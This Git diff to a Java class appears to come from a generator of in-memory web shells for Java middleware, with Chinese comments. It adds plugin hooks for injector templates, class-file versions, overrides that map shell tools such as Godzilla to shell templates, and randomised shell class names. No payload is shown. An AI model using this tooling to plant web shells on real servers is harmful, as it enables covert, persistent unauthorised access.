@@ -10,9 +10,11 @@ import com.reajason.javaweb.memshell.obfuscation.MethodSignature;
 import com.reajason.javaweb.utils.NameSampler;
 import com.reajason.javaweb.utils.StringUtils;
 import com.reajason.javaweb.utils.tuple.Pair;
+import net.bytebuddy.jar.asm.Opcodes;
 
 import java.util.Collections;
 import java.util.LinkedHashMap;
+import java.util.LinkedHashSet;
 import java.util.Map;
 import java.util.Set;
 
@@ -35,6 +37,26 @@ public abstract class AbstractServer {
 
     public Class<?> getListenerInterceptor() {
         return null;
+    }
+
+    /**
+     * 解析注入器模板字节所用的类加载器。
+     * <p>
+     * 插件模板可能继承宿主没有的框架类。生成期 {@code ByteBuddy.redefine} 需要解析模板父类，
+     * 默认的 provider 类加载器看不到这些类时，覆写本方法返回一个能同时看到模板与框架桩的加载器。
+     */
+    public ClassLoader getInjectorTemplateClassLoader() {
+        return getClass().getClassLoader();
+    }
+
+    /**
+     * 该 server 能生成的最低 class 文件版本。
+     * <p>
+     * 模板使用 lambda 或 invokedynamic 时，低于 Java 8 的 class 版本写不出来。默认 Java 6，
+     * 需要 Java 8 的 server 覆写为 {@link Opcodes#V1_8}，生成入口会把调用方给的低版本抬到这条线。
+     */
+    public int getMinimumTargetJreVersion() {
+        return Opcodes.V1_6;
     }
 
     /**
@@ -162,6 +184,31 @@ public abstract class AbstractServer {
         return shellBytes;
     }
 
+    /**
+     * server 注入器字节生成后的专属改写钩子，用于按中间件版本替换父类等生成期无法用配置表达的处理。
+     * 默认原样返回，混淆在内层完成后再进入后续流程。
+     */
+    public byte[] postProcessInjectorBytes(byte[] injectorBytes, ShellConfig shellConfig,
+                                           ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
+        return injectorBytes;
+    }
+
+    /**
+     * 为已注册的工具补充或覆盖 {@code shellType -> shell 模板}。键是工具名，值是工具映射。
+     * <p>
+     * 注册工具时，服务端不再只取「工具映射 ∩ 本服务端注入器类型」：这里声明的条目先落位，
+     * 工具自己的映射只补缺失的类型。因此插件 server 可以给内置工具加一套自己的传输实现
+     * （例如给 Godzilla 加 Akka HTTP 壳），不需要复制工具名、配置项与界面条目。
+     * <p>
+     * 覆盖是否生效仍受两条约束：类型必须在本服务端的 {@link #getShellInjectorMapping()} 里，
+     * 且 shell 模板必须能找到。值为空时回退到工具自己的映射。默认没有覆盖。
+     *
+     * @return 工具名到 shell 模板映射的覆盖表
+     */
+    public Map<String, ToolMapping> getToolMappingOverrides() {
+        return Collections.emptyMap();
+    }
+
     public void addToolMapping(String shellTool, ToolMapping mapping) {
         map.put(shellTool, mapping);
     }
@@ -178,8 +225,27 @@ public abstract class AbstractServer {
             return Collections.emptySet();
         }
         // 与 getShellInjectorPair 共用同一份过滤结果：缺少注入器模板的类型不能对外暴露，
-        // 否则会广告出一个生成时必然失败的类型
-        return Collections.unmodifiableSet(toolMapping.getShellClassMap(getShellInjectorMapping()).keySet());
+        // 否则会广告出一个生成时必然失败的类型。这里同时检查模板字节是否存在，映射里写错类名
+        // 时目录不会广告该类型。
+        ClassLoader templateClassLoader = getInjectorTemplateClassLoader();
+        Set<String> supported = new LinkedHashSet<String>();
+        for (Map.Entry<String, Pair<String, String>> entry
+                : toolMapping.getShellClassMap(getShellInjectorMapping()).entrySet()) {
+            if (templateClassExists(templateClassLoader, entry.getValue().getRight())) {
+                supported.add(entry.getKey());
+            }
+        }
+        return Collections.unmodifiableSet(supported);
+    }
+
+    private static boolean templateClassExists(ClassLoader classLoader, String className) {
+        if (StringUtils.isBlank(className)) {
+            return false;
+        }
+        String resource = className.replace('.', '/') + ".class";
+        return classLoader != null
+                ? classLoader.getResource(resource) != null
+                : ClassLoader.getSystemResource(resource) != null;
     }
 
     public Set<String> getSupportedShellTools() {
@@ -213,10 +279,33 @@ public abstract class AbstractServer {
      * @param shellType  内存马类型，用于推导类名后缀
      */
     public static String generateShellClassName(String serverName, String shellType) {
+        return sampleShellClassName(getWebPackageName(serverName), shellType);
+    }
+
+    /**
+     * 在 server 选定的包名里采样一个 shell 类名。实例钩子 {@link #getShellClassName} 走这里，
+     * 插件覆写包名后仍然复用同一套采样规则。
+     */
+    public static String sampleShellClassName(String shellPackageName, String shellType) {
         NameSampler.SampledName name = NameSampler.sample(toClassNameSuffix(shellType));
-        return getWebPackageName(serverName)
+        return shellPackageName
                 + "." + name.getPackageSegment()
                 + "." + name.getSimpleName();
+    }
+
+    /**
+     * 该 server 的 shell 类名。默认复用静态映射，插件可覆写 {@link #getShellPackageName} 只换包名，
+     * 或整体覆写本方法来控制完整类名。
+     */
+    public String getShellClassName(String serverName, String shellType) {
+        return sampleShellClassName(getShellPackageName(serverName), shellType);
+    }
+
+    /**
+     * shell 类所在包名。默认沿用内置中间件映射，插件 server 可以覆写成目标框架自己的包路径。
+     */
+    public String getShellPackageName(String serverName) {
+        return getWebPackageName(serverName);
     }
 
     /**
